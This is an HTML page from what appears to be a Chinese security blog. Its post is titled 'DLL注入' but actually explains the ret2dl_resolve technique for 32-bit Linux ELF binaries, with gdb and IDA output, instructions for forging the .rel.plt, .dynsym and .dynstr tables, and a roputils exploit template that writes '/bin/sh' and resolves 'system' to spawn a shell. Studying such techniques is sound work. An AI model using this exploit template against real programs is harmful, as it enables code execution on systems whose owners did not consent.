@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>DLL注入 | S3cana&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">S3cana&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/aboutme">Aboutme</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">S3cana&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/aboutme">Aboutme</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2dl-resolve"><span class="toc-text">ret2dl_resolve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#re2dl-resolve"><span class="toc-text">re2dl_resolve</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序执行过程"><span class="toc-text">程序执行过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用点"><span class="toc-text">漏洞利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用方案"><span class="toc-text">利用方案</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-构造过程"><span class="toc-text">payload 构造过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#坑点"><span class="toc-text">坑点</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">DLL注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">S3cana</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 23, 2019&nbsp;&nbsp;00:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/二进制/">二进制</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <h2 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h2><h3 id="re2dl-resolve"><a href="#re2dl-resolve" class="headerlink" title="re2dl_resolve"></a>re2dl_resolve</h3><p>首先来看几个用到的数据结构<br>link_map </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">struct link_map &#123;</span><br><span class="line">    Elf32_Addr l_addr;</span><br><span class="line">    char *l_name;</span><br><span class="line">    Elf32_Dyn *l_ld;</span><br><span class="line">    struct link_map *l_next;</span><br><span class="line">    struct link_map *l_prev;</span><br><span class="line">    struct link_map *l_real;</span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line">    struct libname_list *l_libname;</span><br><span class="line">    Elf32_Dyn *l_info[76];</span><br><span class="line">    const Elf32_Phdr *l_phdr;</span><br><span class="line">    Elf32_Addr l_entry;</span><br><span class="line">    Elf32_Half l_phnum;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>.dynmic结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword     d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line">extern Elf32_Dyn_DYNAMIC[];</span><br></pre></td></tr></table></figure>
+<p>.rel.plt 结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Addr        r_offset;</span><br><span class="line">    Elf32_Word       r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Addr     r_offset;</span><br><span class="line">    Elf32_Word    r_info;</span><br><span class="line">    Elf32_Sword    r_addend;</span><br><span class="line">&#125; Elf32_Rela;</span><br></pre></td></tr></table></figure>
+<p>.dynsym结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;   /* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addr    st_value;  /* Symbol value */</span><br><span class="line">  Elf32_Word    st_size;   /* Symbol size */</span><br><span class="line">  unsigned char st_info;   /* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;  /* Symbol visibility under glibc&gt;=2.2 */</span><br><span class="line">  Elf32_Section st_shndx;  /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
+<p>以上的数据结构在程序解析的时候的作用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">l 是link_map 的地址,gdb 查看link_map 的结构</span><br><span class="line">gdb-peda$ p *l</span><br><span class="line">$8 = &#123;</span><br><span class="line">  l_addr = 0x0, </span><br><span class="line">  l_name = 0xf7ffdc04 &quot;&quot;, </span><br><span class="line">  l_ld = 0x8046194, </span><br><span class="line">  l_next = 0xf7ffdc08, </span><br><span class="line">  l_prev = 0x0, </span><br><span class="line">  l_real = 0xf7ffd918, </span><br><span class="line">  l_ns = 0x0, </span><br><span class="line">  l_libname = 0xf7ffdbf8, </span><br><span class="line">  l_info = &#123;0x0, 0x804619c, 0x804620c, 0x8046204, 0x0, 0x80461dc, 0x80461e4, 0x0, 0x0, 0x0, 0x80461ec, 0x80461f4, 0x80461a4, 0x80461ac, 0x0...&#125;, </span><br><span class="line">在IDA 中 查看 .dynamic 的数据结构</span><br><span class="line">LOAD:080461DC                 Elf32_Dyn &lt;5, &lt;8046284h&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:080461E4                 Elf32_Dyn &lt;6, &lt;8047328h&gt;&gt; ; DT_SYMTAB</span><br><span class="line"></span><br><span class="line">dynamic 中的地址对应着 link_map 中l_info 相应的指针，可从link_map 取到dynamic 结构中.rel.plt .dynsym .dynstr对应的指针,为后来程序的执行提供各个节的基地址</span><br><span class="line">pwndbg&gt;  p/x *(Elf32_Dyn*)0x80461e4</span><br><span class="line">$3 = &#123;</span><br><span class="line">  d_tag = 0x6, </span><br><span class="line">  d_un = &#123;</span><br><span class="line">    d_val = 0x8047328,  #0x8047328对应 DT_SYMTAB</span><br><span class="line">    d_ptr = 0x8047328</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p l-&gt;l_info[6]</span><br><span class="line">$4 = (Elf32_Dyn *) 0x80461e4</span><br></pre></td></tr></table></figure></p>
+<p>link_map的地址、reloc_offset这两者是传入栈上的数值，通过这个参数可以得到要解析的符号分别在.rel.plt节、.dynsym节对应的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">求得 .dynsym 节的地址</span><br><span class="line">const ElfW(Sym) *const symtab</span><br><span class="line">  = (const void *) D_PTR (l, l_info[DT_SYMTAB]);//DT_SYMTAB = 6</span><br><span class="line">const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">得到要解析的符号在.rel.plt节上的地址</span><br><span class="line">const PLTREL *const reloc</span><br><span class="line">  = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure></p>
+<p>然后通过 reloc-&gt;r_info 来找到 该符号对应的 sym</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过 reloc 得到要解析的符号在 dynsym 节的地址</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure>
+<p>当找到 sym 后，可以从sym -&gt;st_name 找到对应的 dynstr</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + e,sym-&gt;st_nam l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="程序执行过程"><a href="#程序执行过程" class="headerlink" title="程序执行过程"></a>程序执行过程</h3><p>当要解析 puts 函数的时候</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">► 0x8048454 &lt;main+25&gt;    call   puts@plt &lt;0x8048310&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当call puts的时候，会先进入 puts 函数的plt表，查找是否绑定，如果没有绑定，则调转到dl_runtime_resolve 来解析其地址</span><br><span class="line">gdb-peda$ x/wx 0x804a010</span><br><span class="line">0x804a010:      0x08048316</span><br><span class="line"></span><br><span class="line">  0x8048310  &lt;puts@plt&gt;                  jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; #0x804a010处的值为0x08048316</span><br><span class="line"> </span><br><span class="line">   0x8048316  &lt;puts@plt+6&gt;                push   8 #这里是传入的reloc_offset 参数，也是要伪造的值</span><br><span class="line">   0x804831b  &lt;puts@plt+11&gt;               jmp    0x80482f0</span><br><span class="line"></span><br><span class="line">   0x80482f0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;# 这里push 的是 link_map的地址</span><br><span class="line">   0x80482f6                              jmp    dword ptr [0x804a008] &lt;0xf7fee000&gt;</span><br><span class="line">   </span><br><span class="line">  ► 0xf7fee000 &lt;_dl_runtime_resolve&gt;      push   eax</span><br><span class="line">   0xf7fee001 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fee002 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fee003 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]  # 要解析的函数的偏移</span><br><span class="line">   0xf7fee007 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]    # 最后一个入栈的数值,link_map 的地址</span><br><span class="line">   0xf7fee00b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe77e0&gt;</span><br><span class="line">当EIP 为 0xf7fee000 的时候  ，栈上的数据为</span><br><span class="line"></span><br><span class="line">gdb-peda$ stack</span><br><span class="line">0000| 0xffffd384 --&gt; 0xf7ffd918 --&gt; 0x0   #link_map 的地址</span><br><span class="line">0004| 0xffffd388 --&gt; 0x8 </span><br><span class="line">0008| 0xffffd38c --&gt; 0x8048459 (&lt;main+30&gt;:      add    esp,0x10)</span><br><span class="line">0012| 0xffffd390 --&gt; 0x8048510 (&quot;hello world&quot;)</span><br><span class="line">0016| 0xffffd394 --&gt; 0x0 </span><br><span class="line">0020| 0xffffd398 --&gt; 0xf7e4ba50 (&lt;__new_exitfn+16&gt;:     add    ebx,0x1835b0)</span><br><span class="line">0024| 0xffffd39c --&gt; 0x80484db (&lt;__libc_csu_init+75&gt;:   add    edi,0x1)</span><br><span class="line">0028| 0xffffd3a0 --&gt; 0x1 </span><br><span class="line"></span><br><span class="line">gdb-peda$ p/x ((struct link_map*)0xf7ffd918)-&gt;l_info</span><br><span class="line">$11 = &#123;0x0, 0x8049f14, 0x8049f84, 0x8049f7c, 0x0, 0x8049f54, 0x8049f5c, 0x0, 0x0, 0x0, 0x8049f64, 0x8049f6c, 0x8049f1c, 0x8049f24, 0x0...&#125;</span><br><span class="line"></span><br><span class="line">[22] .dynamic          DYNAMIC         08049f14 002f14 0000e8 08  WA  1   0  4</span><br><span class="line"></span><br><span class="line">got[0]: 本ELF动态段(.dynamic段）的装载地址</span><br><span class="line">got[1]：本ELF的link_map数据结构描述符地址</span><br><span class="line">got[2]：_dl_runtime_resolve函数的地址</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h3><hr>
+<p>当程序执行到 0x8048316的时候，会push 参数进入栈，这个参数是dl_runtime_resolve的第二个参数reloc_arg</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">	   struct link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
+<p>通过这个参数可以找到要解析的符号在.rel.plt段的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const PLTREL *const reloc</span><br><span class="line">     = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure>
+<p>所以 reloc 是可以伪造的，而之后对该符号最终在dynstr上的解析是依赖与reloc的，依次伪造.dynsym .dynstr段便可以得到最终要解析的符号的名称的地址，以达到攻击的目的。</p>
+<h3 id="利用方案"><a href="#利用方案" class="headerlink" title="利用方案"></a>利用方案</h3><hr>
+<p>我们要分别伪造 .rel.plt .dynsym .dynstr 三个表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.rel.plt </span><br><span class="line">00000000 Elf32_Rel        struc ; (sizeof=0x8, align=0x4, copyof_2)</span><br><span class="line">00000000                                         ; XREF: LOAD:080482AC/r</span><br><span class="line">00000000                                         ; LOAD:080482B4/r ...</span><br><span class="line">00000000 r_offset          dd ?</span><br><span class="line">00000004 r_info             dd ?</span><br><span class="line">00000008 Elf32_Rel       ends</span><br><span class="line">.dynsym</span><br><span class="line">00000000 Elf32_Sym       struc ; (sizeof=0x10, align=0x4, mappedto_1)</span><br><span class="line">00000000                                         ; XREF: LOAD:080471F8/r</span><br><span class="line">00000000                                         ; LOAD:08047208/r ...</span><br><span class="line">00000000 st_name         dd ?                    ; offset (08046284)</span><br><span class="line">00000004 st_value        dd ?                    ; offset (00000000)</span><br><span class="line">00000008 st_size         dd ?</span><br><span class="line">0000000C st_info         db ?</span><br><span class="line">0000000D st_other        db ?</span><br><span class="line">0000000E st_shndx        dw ?</span><br><span class="line">00000010 Elf32_Sym       ends</span><br><span class="line">.dynstr </span><br><span class="line">LOAD:0804629E aPuts           db &apos;puts&apos;,0             ; DATA XREF: LOAD:08047218↓o # 这里要伪造 system</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/seanachao/Photo/master/1593134601_20200626092312504_24730.png" alt="ret2_dl_resolve"></p>
+<h4 id="payload-构造过程"><a href="#payload-构造过程" class="headerlink" title="payload 构造过程"></a>payload 构造过程</h4><hr>
+<p><strong>手动构造 </strong></p>
+<p>假设获取到的各个节的基地址分别为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&apos;./file&apos;)</span><br><span class="line">base_rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</span><br><span class="line">base_dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</span><br><span class="line">base_dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</span><br></pre></td></tr></table></figure>
+<p>假设 伪造的 .rel.plt 表地址从fake_rel_plt 处开始，那么首先要伪造的r_offset的偏移为 reloc_offset =  fake_rel_plt - base_rel_plt 并在 fake_rel_plt 处建立新的 .rel.plt 表,<br>伪造rel.plt表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里主要是伪造r_info的值</span><br><span class="line">align = 0x10 - ((fake_dynsym - base_dynsym)&amp;0xf)</span><br><span class="line">fake_dynsym = align + fake_dynsym</span><br><span class="line">r_info = ((fake_dynsym -base_dynsym)/0x10)&lt;&lt; 8 | 0x7</span><br></pre></td></tr></table></figure>
+<p>伪造 dynsym 表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里主要伪造的是 st_name </span><br><span class="line">base_dynsym:  st_name</span><br><span class="line">fake_dynstr 可以任意定义</span><br><span class="line">st_name = fake_dynstr +0x10 - base_dynstr</span><br></pre></td></tr></table></figure>
+<p><strong>自动构造模板</strong></p>
+<p>exp模板，使用的是roputils</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">其中 0x80484a0是跳转读的地址</span><br><span class="line">elf = ELF(&apos;&apos;)</span><br><span class="line">addr_bss = elf.bss()</span><br><span class="line">buf=&apos;a&apos;*offset</span><br><span class="line">buf+=p32(0x080484A0)+p32(0x804864B)+p32(0)+p32(addr_bss)+p32(100)</span><br><span class="line">p.send(buf)</span><br><span class="line">buf=rop.string(&apos;/bin/sh&apos;).ljust(20,&apos;a&apos;)</span><br><span class="line">buf+=rop.dl_resolve_data(addr_bss+20,&apos;system&apos;).ljust(80,&apos;b&apos;)</span><br><span class="line">p.send(buf)</span><br><span class="line">p.recvuntil(&quot;ASLR\n&quot;)</span><br><span class="line">buf=&apos;a&apos;*offset+rop.dl_resolve_call(addr_bss+20,addr_bss)</span><br><span class="line">p.send(buf)</span><br></pre></td></tr></table></figure>
+<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>在自己构造的时候有个version的值，由于我们在一般把表伪造在bss段上，所以rel_offset会比较大，version会出现错误</p>
+<p><strong>参考文章</strong></p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/4473" target="_blank" rel="noopener">https://xz.aliyun.com/t/4473</a></li>
+<li>linux 动态链接机制研究与应用 张和君，张跃</li>
+<li><a href="https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li>
+<li><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></li>
+<li><a href="https://github.com/inaz2/roputils/blob/master/roputils.py" target="_blank" rel="noopener">https://github.com/inaz2/roputils/blob/master/roputils.py</a></li>
+</ul>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/11/25/glibc_debug 编译/">glibc 编译</a>
+            
+            
+            <a class="next" rel="next" href="/2019/04/20/shell脚本(精脚本)/">shell脚本</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© S3cana | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
